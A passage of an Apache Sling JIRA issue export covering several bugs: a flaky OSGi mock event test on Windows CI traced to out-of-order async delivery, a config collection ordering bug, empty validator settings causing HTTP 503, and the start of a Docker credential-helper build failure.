                            <comment id="17741929" author="egli" created="Tue, 11 Jul 2023 09:46:27 +0000"  >&lt;p&gt;Merged &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-event/pull/31&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;PR&lt;/a&gt;, thx &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=patlego&quot; class=&quot;user-hover&quot; rel=&quot;patlego&quot;&gt;patlego&lt;/a&gt; !&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 15 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1iunk:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11916] osgi-mock: MockEventAdminTest.testPostEvents times out on Jenkins/Windows</title>
                <link>https://issues.apache.org/jira/browse/SLING-11916</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The error is&lt;/p&gt;

&lt;p&gt;&#160;&lt;br/&gt;
&#160;&lt;/p&gt;
&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[ERROR] org.apache.sling.testing.mock.osgi.MockEventAdminTest.testPostEvents  Time elapsed: 3.02 s  &amp;lt;&amp;lt;&amp;lt; ERROR!
org.junit.runners.model.TestTimedOutException: test timed out after 3000 milliseconds
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and seems to affect both Java 11 and 17.&lt;/p&gt;


&lt;p&gt;&lt;a href=&quot;https://ci-builds.apache.org/blue/organizations/jenkins/Sling%2Fmodules%2Fsling-org-apache-sling-testing-osgi-mock/detail/PR-27/1/pipeline&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://ci-builds.apache.org/blue/organizations/jenkins/Sling%2Fmodules%2Fsling-org-apache-sling-testing-osgi-mock/detail/PR-27/1/pipeline&lt;/a&gt; (Java 11, Windows)&lt;br/&gt;
&lt;a href=&quot;https://ci-builds.apache.org/blue/organizations/jenkins/Sling%2Fmodules%2Fsling-org-apache-sling-testing-osgi-mock/detail/master/229/pipeline&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://ci-builds.apache.org/blue/organizations/jenkins/Sling%2Fmodules%2Fsling-org-apache-sling-testing-osgi-mock/detail/master/229/pipeline&lt;/a&gt; (Java 17, Windows)&lt;br/&gt;
&lt;a href=&quot;https://ci-builds.apache.org/blue/organizations/jenkins/Sling%2Fmodules%2Fsling-org-apache-sling-testing-osgi-mock/detail/master/228/pipeline&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://ci-builds.apache.org/blue/organizations/jenkins/Sling%2Fmodules%2Fsling-org-apache-sling-testing-osgi-mock/detail/master/228/pipeline&lt;/a&gt; (Java 17, Windows)&lt;/p&gt;</description>
                <environment></environment>
        <key id="13541556">SLING-11916</key>
            <summary>osgi-mock: MockEventAdminTest.testPostEvents times out on Jenkins/Windows</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="sseifert">Stefan Seifert</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Tue, 27 Jun 2023 11:54:34 +0000</created>
                <updated>Mon, 20 Nov 2023 10:44:06 +0000</updated>
                            <resolved>Thu, 19 Oct 2023 10:09:01 +0000</resolved>
                                                    <fixVersion>Testing OSGi Mock 3.4.0</fixVersion>
                                    <component>Testing</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                                                                                <comments>
                            <comment id="17737635" author="rombert" created="Tue, 27 Jun 2023 12:34:40 +0000"  >&lt;p&gt;My hunch was incorrect - &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-osgi-mock/pull/28&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-osgi-mock/pull/28&lt;/a&gt; so I won&apos;t pursue this any further. If anyone wants to try and fix this, please do.&lt;/p&gt;</comment>
                            <comment id="17739617" author="sseifert@pro-vision.de" created="Mon, 3 Jul 2023 13:44:37 +0000"  >&lt;p&gt;i enabled debug logging in the PR for the unit tests, but all tests are green. so it seems this test is basically flaky, it does not fail always (on my local machine it fails only very rarely).&lt;/p&gt;</comment>
                            <comment id="17739639" author="rombert" created="Mon, 3 Jul 2023 14:32:26 +0000"  >&lt;p&gt;Maybe the Windows VMs are simply slower/more loaded compared to the Linux VMs, leading to more frequent timeouts?&lt;/p&gt;</comment>
                            <comment id="17739643" author="sseifert@pro-vision.de" created="Mon, 3 Jul 2023 14:38:49 +0000"  >&lt;p&gt;maybe yes - on the other side the timeout is already configured to 3000ms - for a operation that usually should take only a few ms. and there is no I/O involved in the unit test.&lt;br/&gt;
so it seems unlikely that an environment which is 50%-100% slower or so this leads to such a drastic increase.&lt;/p&gt;</comment>
                            <comment id="17754637" author="sseifert@pro-vision.de" created="Tue, 15 Aug 2023 12:57:38 +0000"  >&lt;p&gt;the latest builds i observed did run fine in the CI - removing the next version from the ticket&lt;/p&gt;</comment>
                            <comment id="17776593" author="sseifert@pro-vision.de" created="Wed, 18 Oct 2023 10:15:16 +0000"  >&lt;p&gt;it happens again quite regularly on the CI with windows an java 17 (not reproducible locally...)&lt;br/&gt;
we need to look into it.&lt;/p&gt;</comment>
                            <comment id="17776887" author="madamcin" created="Wed, 18 Oct 2023 20:17:27 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sseifert&quot; class=&quot;user-hover&quot; rel=&quot;sseifert&quot;&gt;sseifert&lt;/a&gt; I was able to trace this locally and in &lt;a href=&quot;https://ci-builds.apache.org/blue/organizations/jenkins/Sling%2Fmodules%2Fsling-org-apache-sling-testing-osgi-mock/detail/PR-34/1/pipeline&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;Jenkins&lt;/a&gt;&#160;after adding logging and moving the assertion into the DummyEventHandler class so the failed condition could be examined when it occurred. Then I just ran it a bunch until it failed. When it did fail, this log message was repeated until the timeout, which points to out-of-order delivery of EVENT_SAMPLE_2, and EVENT_OTHER_3:&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
[Time-limited test] ERROR org.apache.sling.testing.mock.osgi.MockEventAdminTest - missed expectations [org.osgi.service.event.Event [topic=sample/topic2] {}, org.osgi.service.event.Event [topic=other/topic3] {}] received [org.osgi.service.event.Event [topic=other/topic3] {}, org.osgi.service.event.Event [topic=sample/topic2] {}] &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;According to &lt;a href=&quot;https://docs.osgi.org/specification/osgi.cmpn/7.0.0/service.event.html#i1556001&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://docs.osgi.org/specification/osgi.cmpn/7.0.0/service.event.html#i1556001&lt;/a&gt; the default async delivery behavior should be ordered, rather than each event being delivered on its own thread as &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-osgi-mock/blob/907dbbd5e6707b6be5f19f8af6dedcd6cdf2f87d/core/src/main/java/org/apache/sling/testing/mock/osgi/MockEventAdmin.java#L74-L91&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;MockEventAdmin&lt;/a&gt; is currently doing:&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
&#160; &#160; @Override
&#160; &#160; &lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; void postEvent(&lt;span class=&quot;code-keyword&quot;&gt;final&lt;/span&gt; Event event) {
&#160; &#160; &#160; &#160; &lt;span class=&quot;code-keyword&quot;&gt;if&lt;/span&gt; (log.isDebugEnabled()) {
&#160; &#160; &#160; &#160; &#160; &#160; log.debug(&lt;span class=&quot;code-quote&quot;&gt;&quot;Send event: {}, bundleContext={}&quot;&lt;/span&gt;, event.getTopic(), &lt;span class=&quot;code-keyword&quot;&gt;this&lt;/span&gt;.bundleContext);
&#160; &#160; &#160; &#160; }
&#160; &#160; &#160; &#160; &lt;span class=&quot;code-keyword&quot;&gt;try&lt;/span&gt; {
&#160; &#160; &#160; &#160; &#160; &#160; asyncHandler.execute(&lt;span class=&quot;code-keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;code-object&quot;&gt;Runnable&lt;/span&gt;() {
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; @Override
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; void run() {
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; distributeEvent(event);
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; }
&#160; &#160; &#160; &#160; &#160; &#160; });
&#160; &#160; &#160; &#160; }
&#160; &#160; &#160; &#160; &lt;span class=&quot;code-keyword&quot;&gt;catch&lt;/span&gt; (RejectedExecutionException ex) {
&#160; &#160; &#160; &#160; &#160; &#160; &lt;span class=&quot;code-comment&quot;&gt;// ignore
&lt;/span&gt;&#160; &#160; &#160; &#160; &#160; &#160; log.debug(&lt;span class=&quot;code-quote&quot;&gt;&quot;Ignore rejected execution: &quot;&lt;/span&gt; + ex.getMessage(), ex);;
&#160; &#160; &#160; &#160; }
&#160; &#160; } &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;</comment>
                            <comment id="17777173" author="sseifert@pro-vision.de" created="Thu, 19 Oct 2023 10:09:01 +0000"  >&lt;p&gt;great &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=madamcin&quot; class=&quot;user-hover&quot; rel=&quot;madamcin&quot;&gt;madamcin&lt;/a&gt;, thanks for finding the root cause!&lt;/p&gt;

&lt;p&gt;for fixing i&apos;ve gone the simple way and switched to a single threaded executor which should be sufficient and easier to manage for the unit test scenario. i&apos;ve run the full CI tests on jenkins five times and they always did pass.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-osgi-mock/commit/52d25d277251676acd322892aeb418107d930660&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-osgi-mock/commit/52d25d277251676acd322892aeb418107d930660&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1it3k:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11915] caconfig-mock-plugin: Order of collection items may be lost in writeConfigurationCollection</title>
                <link>https://issues.apache.org/jira/browse/SLING-11915</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;when using &lt;tt&gt;MockContextAwareConfig.writeConfigurationCollection&lt;/tt&gt; the order of collection items may be lost.&lt;br/&gt;
this is a unwanted side-effected of &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11839&quot; title=&quot;caconfig-mock-plugin: Support writing nested configurations and configuration collections&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11839&quot;&gt;&lt;del&gt;SLING-11839&lt;/del&gt;&lt;/a&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13541551">SLING-11915</key>
            <summary>caconfig-mock-plugin: Order of collection items may be lost in writeConfigurationCollection</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="sseifert">Stefan Seifert</assignee>
                                    <reporter username="sseifert">Stefan Seifert</reporter>
                        <labels>
                    </labels>
                <created>Tue, 27 Jun 2023 11:33:53 +0000</created>
                <updated>Fri, 30 Jun 2023 12:49:45 +0000</updated>
                            <resolved>Tue, 27 Jun 2023 11:50:10 +0000</resolved>
                                    <version>Context-Aware Configuration Mock Plugin 1.5.0</version>
                                    <fixVersion>Context-Aware Configuration Mock Plugin 1.5.2</fixVersion>
                                    <component>Testing</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17737612" author="sseifert@pro-vision.de" created="Tue, 27 Jun 2023 11:50:10 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-caconfig-mock-plugin/commit/4c987ec627fc7b1f84bd630fe9dd2f6a01dea878&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-caconfig-mock-plugin/commit/4c987ec627fc7b1f84bd630fe9dd2f6a01dea878&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310560">
                    <name>Problem/Incident</name>
                                                                <inwardlinks description="is caused by">
                                        <issuelink>
            <issuekey id="13533407">SLING-11839</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 17 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1it2g:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11912] Empty configuration in ServiceUserMapperImpl&apos;s Required Principal/User validators results in 503</title>
                <link>https://issues.apache.org/jira/browse/SLING-11912</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;1) In webconsole configuration manager, open &lt;tt&gt;Apache Sling Service User Mapper Serviceorg.apache.sling.serviceusermapping.impl.ServiceUserMapperImpl&lt;/tt&gt;&lt;br/&gt;
2) Before making any change the configuration is:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-xml&quot;&gt;
:org.apache.felix.configadmin.revision:=L&lt;span class=&quot;code-quote&quot;&gt;&quot;1&quot;&lt;/span&gt;
require.validation=B&lt;span class=&quot;code-quote&quot;&gt;&quot;true&quot;&lt;/span&gt;
service.pid=&lt;span class=&quot;code-quote&quot;&gt;&quot;org.apache.sling.serviceusermapping.impl.ServiceUserMapperImpl&quot;&lt;/span&gt;
user.enable.default.mapping=B&lt;span class=&quot;code-quote&quot;&gt;&quot;false&quot;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;3) Without changing the configuration click on &lt;tt&gt;save&lt;/tt&gt;, the configuration becomes:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-xml&quot;&gt;
:org.apache.felix.configadmin.revision:=L&lt;span class=&quot;code-quote&quot;&gt;&quot;8&quot;&lt;/span&gt;
require.validation=B&lt;span class=&quot;code-quote&quot;&gt;&quot;true&quot;&lt;/span&gt;
required.principal.validators=[ \
  &quot;&quot;, \
  ]
required.user.validators=[ \
  &quot;&quot;, \
  ]
service.pid=&lt;span class=&quot;code-quote&quot;&gt;&quot;org.apache.sling.serviceusermapping.impl.ServiceUserMapperImpl&quot;&lt;/span&gt;
user.default=&quot;&quot;
user.enable.default.mapping=B&lt;span class=&quot;code-quote&quot;&gt;&quot;false&quot;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;i.e &lt;tt&gt;required.principal.validators&lt;/tt&gt; and &lt;tt&gt;required.user.validators&lt;/tt&gt; have an empty value and due to this all sling requests return&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-xml&quot;&gt;
&lt;span class=&quot;code-quote&quot;&gt;&quot;HTTP ERROR 503 ServletResolver service missing, cannot service requests&quot;&lt;/span&gt;.
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This persistence of empty configuration seems to be behaviour of &lt;tt&gt;felix.webconsole&lt;/tt&gt;. But IMO sling requests should not fail due to empty values.&lt;/p&gt;

&lt;p&gt;(The above scenario was reproduced in an AEM instance)&lt;/p&gt;</description>
                <environment></environment>
        <key id="13540857">SLING-11912</key>
            <summary>Empty configuration in ServiceUserMapperImpl&apos;s Required Principal/User validators results in 503</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="sagarmiglani">Sagar Miglani</assignee>
                                    <reporter username="sagarmiglani">Sagar Miglani</reporter>
                        <labels>
                    </labels>
                <created>Wed, 21 Jun 2023 08:09:15 +0000</created>
                <updated>Mon, 21 Aug 2023 09:01:54 +0000</updated>
                            <resolved>Thu, 20 Jul 2023 05:56:10 +0000</resolved>
                                    <version>Service User Mapper 1.5.6</version>
                                    <fixVersion>Service User Mapper 1.5.8</fixVersion>
                                    <component>Service User Mapper</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                                                                                <comments>
                            <comment id="17735639" author="kwin" created="Wed, 21 Jun 2023 09:56:01 +0000"  >&lt;p&gt;This sounds like a bug in the Felix web console. IMHO empty values are not reasonable to support here. &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sagarmiglani&quot; class=&quot;user-hover&quot; rel=&quot;sagarmiglani&quot;&gt;sagarmiglani&lt;/a&gt; Can you propose a fix for &lt;a href=&quot;https://github.com/apache/felix-dev/blob/master/webconsole/src/main/java/org/apache/felix/webconsole/internal/configuration/ConfigManager.java&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/felix-dev/blob/master/webconsole/src/main/java/org/apache/felix/webconsole/internal/configuration/ConfigManager.java&lt;/a&gt; instead?&lt;/p&gt;</comment>
                            <comment id="17739799" author="cziegeler" created="Tue, 4 Jul 2023 05:57:31 +0000"  >&lt;p&gt;while I agree that this is a bug in the webconsole, I think Sling could be more lenient and ignore those empty values (in addition to fixing the bug in the webconsole)&lt;/p&gt;</comment>
                            <comment id="17754924" author="cziegeler" created="Wed, 16 Aug 2023 08:22:06 +0000"  >&lt;p&gt;Updated PR &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-serviceusermapper/pull/8&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-serviceusermapper/pull/8&lt;/a&gt; got merged&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13540858">FELIX-6614</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 10 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1iot4:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11905] Starter builds fail on Windows nodes:  Error getting the credentials for docker.io from the configured credential helper</title>
                <link>https://issues.apache.org/jira/browse/SLING-11905</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The reported error is &lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[ERROR] Failed to execute goal io.fabric8:docker-maven-plugin:0.42.1:build (build-docker-image) on project org.apache.sling.starter: Error getting the credentials for docker.io from the configured credential helper: Failed to start &apos;docker-credential-desktop get&apos; : Cannot run program &quot;docker-credential-desktop&quot;: CreateProcess error=2, The system cannot find the file specified -&amp;gt; [Help 1]
org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal io.fabric8:docker-maven-plugin:0.42.1:build (build-docker-image) on project org.apache.sling.starter: Error getting the credentials for docker.io from the configured credential helper
    at org.apache.maven.lifecycle.internal.MojoExecutor.doExecute2 (MojoExecutor.java:347)
